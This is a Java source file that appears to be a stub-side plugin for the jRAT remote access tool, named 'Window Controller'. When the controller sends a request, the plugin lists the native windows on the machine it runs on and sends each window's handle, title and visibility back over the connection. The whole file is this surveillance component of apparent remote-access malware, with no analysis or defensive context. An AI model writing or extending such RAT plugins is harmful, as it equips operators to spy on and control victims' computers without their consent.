package se.jrat.plugin.window.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.ArrayList;
import java.util.List;

import jrat.api.stub.StubPlugin;
import nativewindowlib.NativeWindow;
import nativewindowlib.WindowUtils;

public class WindowPlugin extends StubPlugin {
	
	public static final byte HEADER_LIST = -127;
	
	private DataInputStream dis;
	private DataOutputStream dos;

	@Override
	public void onStart() throws Exception {
		
	}

	@Override
	public void onDisconnect(Exception ex) throws Exception {
		
	}

	@Override
	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
		this.dis = dis;
		this.dos = dos;
	}

	@Override
	public void onPacket(byte header) throws Exception {
		if (header == HEADER_LIST) {
			dos.writeByte(HEADER_LIST);
			
			List<NativeWindow> windows = WindowUtils.getWindows();
			List<NativeWindow> sendWindows = new ArrayList<NativeWindow>();
			
			for (NativeWindow window : windows) {
				if (!window.isVisible() || window.isVisible() && window.getTitle().length() > 0) {
					sendWindows.add(window);
				}
			}
			
			dos.writeInt(sendWindows.size());
			
			for (int i = 0; i < sendWindows.size(); i++) {
				NativeWindow window = sendWindows.get(i);
				
				dos.writeInt(window.getHwnd());
				writeString(window.getTitle());
				dos.writeBoolean(window.isVisible());
			}
		}
	}
	
	@Override
	public String getName() {
		return "Window Controller";
	}

	@Override
	public void onEnable() throws Exception {
		
	}
	
	private void writeString(String s) throws Exception {
		if (dos != null) {
			dos.writeShort(s.length());
			dos.writeChars(s);
		}
	}

}
